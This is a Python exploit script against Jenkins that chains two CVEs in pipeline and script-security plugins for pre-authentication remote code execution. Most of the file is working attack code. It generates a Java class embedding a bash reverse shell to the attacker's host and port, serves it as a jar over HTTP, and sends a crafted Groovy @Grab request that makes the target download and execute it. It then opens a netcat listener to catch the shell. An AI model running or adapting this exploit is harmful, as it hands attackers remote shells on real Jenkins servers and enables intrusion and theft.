#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#                                                                                                           #
#▐▄▄▄▄▄▄ . ▐ ▄ ▄ •▄ ▪   ▐ ▄ .▄▄ ·  ▄▄▄·▄▄▄  ▄▄▄ . ▄▄▄· ▄• ▄▌▄▄▄▄▄ ▄ .▄▄▄▄   ▄▄· ▄▄▄ .                       #
#·██▀▄.▀·•█▌▐██▌▄▌▪██ •█▌▐█▐█ ▀. ▐█ ▄█▀▄ █·▀▄.▀·▐█ ▀█ █▪██▌•██  ██▪▐█▀▄ █·▐█ ▌▪▀▄.▀·                        #
#▪▄ ██▐▀▀▪▄▐█▐▐▌▐▀▀▄·▐█·▐█▐▐▌▄▀▀▀█▄ ██▀·▐▀▀▄ ▐▀▀▪▄▄█▀▀█ █▌▐█▌ ▐█.▪██▀▐█▐▀▀▄ ██ ▄▄▐▀▀▪▄                      #
#▐▌▐█▌▐█▄▄▌██▐█▌▐█.█▌▐█▌██▐█▌▐█▄▪▐█▐█▪·•▐█•█▌▐█▄▄▌▐█ ▪▐▌▐█▄█▌ ▐█▌·██▌▐▀▐█•█▌▐███▌▐█▄▄                       #▌
#▀▀▀• ▀▀▀ ▀▀ █▪·▀  ▀▀▀▀▀▀ █▪ ▀▀▀▀ .▀   .▀  ▀ ▀▀▀  ▀  ▀  ▀▀▀  ▀▀▀ ▀▀▀ ·.▀  ▀·▀▀▀  ▀▀▀                        #
# jenkins_preauth_rce .py - mikael.kall@kindredgroup.com                                                    #
#                                                                                                           #
# DATE                                                                                                      #
# 03/04/2019                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# This exploit chains CVE-2019-1003000 and CVE-2018-1999002 for Pre-Auth Remote Code Execution in Jenkins   #
# https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266                                            #
#                                                                                                           #
# Vulnerable Plugins -                                                                                      #
# Pipeline: Declarative Plugin up to and including 1.3.4                                                    #
# Pipeline: Groovy Plugin up to and including 2.61                                                          #
# Script Security Plugin up to and including 1.49                                                           #
#                                                                                                           #
# Just improved the EDB version                                                                             #
#                                                                                                           #
# mikael.kall@kindredgroup.com                                                                              #
#                                                                                                           #
#############################################################################################################

import requests
import random
import signal
import os
import string
import sys
import time

import SimpleHTTPServer
import SocketServer
from multiprocessing import Process

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def random_string_generator(size=8, chars=string.ascii_lowercase + string.ascii_uppercase):
    return ''.join(random.choice(chars) for _ in range(size))

# Random name
APP_BASE = random_string_generator()


def BuildPayload():

    app_base = APP_BASE
    current_dir = os.getcwd()

    try:
        os.makedirs('/tmp/package/%s/1/META-INF' % app_base)
        os.makedirs("/tmp/package/%s/1/META-INF/services/" % app_base)
    except:
        pass

    os.chdir("/tmp/package/%s/1/" % app_base)

    payload = 'public class %s {\n' % app_base
    payload += '  public %s() {\n' % app_base
    payload += '    try {\n'
    payload += '      String payload = "bash -i >& /dev/tcp/{:s}/{:s} 0>&1";\n'.format(LHOST, LPORT)
    payload += '      String[] cmds = { "/bin/bash", "-c", payload };\n'
    payload += '      java.lang.Runtime.getRuntime().exec(cmds);\n'
    payload += '    } catch (Exception e) {\n'
    payload += '    }\n'
    payload += '  }\n'
    payload += '}\n'

    payload = 'public class %s {\n' % app_base
    payload += '  public %s() {\n' % app_base
    payload += '    try {\n'
    payload += '      String payload = "bash -i >& /dev/tcp/{:s}/{:s} 0>&1";\n'.format(LHOST, LPORT)
    payload += '      String[] cmds = { "/bin/bash", "-c", payload };\n'
    payload += '      java.lang.Runtime.getRuntime().exec(cmds);\n'
    payload += '    } catch (Exception e) {\n'
    payload += '    }\n'
    payload += '  }\n'
    payload += '}\n'

    print("[+] Generating payload")
    with open('{:s}.java'.format(app_base), 'w') as file:
        file.write(payload)

    with open('/tmp/package/%s/1/META-INF/services/org.codehaus.groovy.plugins.Runners' % app_base, 'w') as f:
        f.write(app_base)

    os.system("javac -Xlint:-options -source 6 -target 1.6 %s.java" % app_base)
    os.system("jar cf %s-1.jar ." % app_base)

    os.chdir(current_dir)


def HttpListener():

    os.chdir('/tmp/')
    HTTP_PORT = 8000
    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer(("", HTTP_PORT), Handler)
    print("[+] HTTP Listen = %s" % HTTP_PORT)
    httpd.serve_forever()


def exploit():

    time.sleep(5)
    print("[+] Exploit")

    cookies = \
        {
            'JSESSIONID.xx': 'XXXXXXXXXXXXXXXXXXXXXXXX',
        }

    headers = \
        {
            'Host': '{:s}'.format(URL),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
        }

    response = requests.get(
        (
            '{:s}/securityRealm/user/admin/descriptorByName/'
            'org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value='
            '@GrabConfig(disableChecksums=true)%0a'
            '@GrabResolver(name=%27{:s}%27,%20root=%27http://{:s}%3A8000%27)%0a'
            '@Grab(group=%27package%27,%20module=%27{:s}%27,%20version=%271%27)%0aimport%20Payload;'.format(
                URL,
                APP_BASE,
                LHOST,
                APP_BASE
            )
        ),
        headers=headers,
        cookies=cookies,
        verify=False
    )

    time.sleep(4)
    os.system("rm -rf /tmp/package")
    return True


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
 ▐▄▄▄▄▄▄ . ▐ ▄ ▄ •▄ ▪   ▐ ▄ .▄▄ ·  ▄▄▄·▄▄▄  ▄▄▄ . ▄▄▄· ▄• ▄▌▄▄▄▄▄ ▄ .▄▄▄▄   ▄▄· ▄▄▄ .
  ·██▀▄.▀·•█▌▐██▌▄▌▪██ •█▌▐█▐█ ▀. ▐█ ▄█▀▄ █·▀▄.▀·▐█ ▀█ █▪██▌•██  ██▪▐█▀▄ █·▐█ ▌▪▀▄.▀·
▪▄ ██▐▀▀▪▄▐█▐▐▌▐▀▀▄·▐█·▐█▐▐▌▄▀▀▀█▄ ██▀·▐▀▀▄ ▐▀▀▪▄▄█▀▀█ █▌▐█▌ ▐█.▪██▀▐█▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐▌▐█▌▐█▄▄▌██▐█▌▐█.█▌▐█▌██▐█▌▐█▄▪▐█▐█▪·•▐█•█▌▐█▄▄▌▐█ ▪▐▌▐█▄█▌ ▐█▌·██▌▐▀▐█•█▌▐███▌▐█▄▄▌
 ▀▀▀• ▀▀▀ ▀▀ █▪·▀  ▀▀▀▀▀▀ █▪ ▀▀▀▀ .▀   .▀  ▀ ▀▀▀  ▀  ▀  ▀▀▀  ▀▀▀ ▀▀▀ ·.▀  ▀·▀▀▀  ▀▀▀ 
[mikael.kall@kindredgroup.com]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./jenkins_preauth_rce.py 'http://10.10.10.70' 10.10.14.24 1337\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print("[+] LHOST = %s" % LHOST)
    print("[+] LPORT = %s" % LPORT)

    # Start http listener
    p = Process(target=HttpListener)
    p.start()

    BuildPayload()

    # Run exploit Async
    p = Process(target=exploit)
    p.start()

    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)